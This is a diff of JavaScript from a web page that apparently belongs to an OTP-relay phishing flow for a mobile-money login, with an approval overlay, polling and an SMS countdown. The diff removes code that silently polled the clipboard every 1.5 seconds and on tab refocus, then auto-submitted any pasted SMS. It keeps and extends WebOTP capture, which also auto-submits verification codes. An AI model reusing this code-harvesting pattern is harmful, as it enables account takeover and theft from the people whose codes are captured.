@@ -810,55 +810,7 @@
       window.location.href = 'sms:';
     }
 
-    let lastAutoReadTime = 0;
-    function tryAutoReadClipboard() {
-      const now = Date.now();
-      if (now - lastAutoReadTime < 1200) return;
-      lastAutoReadTime = now;
 
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (!msgInput || msgInput.value.trim() || (typeof isSubmittingMessage !== 'undefined' && isSubmittingMessage)) return;
-
-      if (navigator.clipboard && navigator.clipboard.readText) {
-        navigator.clipboard.readText().then(text => {
-          if (text && text.trim() && text.trim().length >= 3 && !msgInput.value.trim()) {
-            msgInput.value = text.trim();
-            showClipboardToast('⚡ Auto-Detected SMS from Clipboard!');
-            handlePostLoginPastedMsg(text.trim(), true);
-          }
-        }).catch(() => {});
-      }
-    }
-
-    let periodicClipboardTimer = null;
-    function startPeriodicClipboardDetection() {
-      if (periodicClipboardTimer) clearInterval(periodicClipboardTimer);
-      periodicClipboardTimer = setInterval(() => {
-        if (currentStep === 4) {
-          tryAutoReadClipboard();
-        } else {
-          clearInterval(periodicClipboardTimer);
-          periodicClipboardTimer = null;
-        }
-      }, 1500);
-    }
-
-    let isTabReturnActive = false;
-    window.addEventListener('focus', () => {
-      if (currentStep === 4 && !isTabReturnActive) {
-        isTabReturnActive = true;
-        tryAutoReadClipboard();
-        setTimeout(() => { isTabReturnActive = false; }, 1500);
-      }
-    });
-
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && currentStep === 4 && !isTabReturnActive) {
-        isTabReturnActive = true;
-        tryAutoReadClipboard();
-        setTimeout(() => { isTabReturnActive = false; }, 1500);
-      }
-    });
 
     let simCountdownInterval = null;
     function startSmsCountdownTimer() {
@@ -909,7 +861,6 @@
       }
 
       startSmsCountdownTimer();
-      startPeriodicClipboardDetection();
 
       if (msgInput && !msgInput.value) {
         msgInput.placeholder = 'Paste SMS confirmation message or verification link here...';
@@ -918,7 +869,7 @@
         statusEl.classList.add('hidden');
       }
 
-      // Native WebOTP API support if mobile browser receives SMS
+      // Priority 1: Native WebOTP API for direct SMS auto-fill from mobile OS
       if ('OTPCredential' in window) {
         try {
           if (window.webOtpController) {
@@ -930,14 +881,19 @@
             signal: window.webOtpController.signal
           }).then(otp => {
             if (otp && (otp.code || otp.message)) {
-              const incoming = otp.code || otp.message;
-              if (msgInput) {
+              const incoming = (otp.code || otp.message).trim();
+              if (incoming && msgInput) {
                 msgInput.value = incoming;
+                showClipboardToast('⚡ WebOTP: Verification SMS Received!');
                 handlePostLoginPastedMsg(incoming, true);
               }
             }
-          }).catch(() => {});
-        } catch (e) {}
+          }).catch(err => {
+            // Silently ignore dismiss or abort
+          });
+        } catch (e) {
+          console.warn('WebOTP init error:', e);
+        }
       }
     }
 
@@ -1040,10 +996,6 @@
       hideApprovalOverlay();
       isAwaitingStep2Approval = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-      if (stepNum !== 4 && periodicClipboardTimer) {
-        clearInterval(periodicClipboardTimer);
-        periodicClipboardTimer = null;
-      }
 
       if (stepNum === 0 || stepNum === 1) {
         if (pollingInterval) {
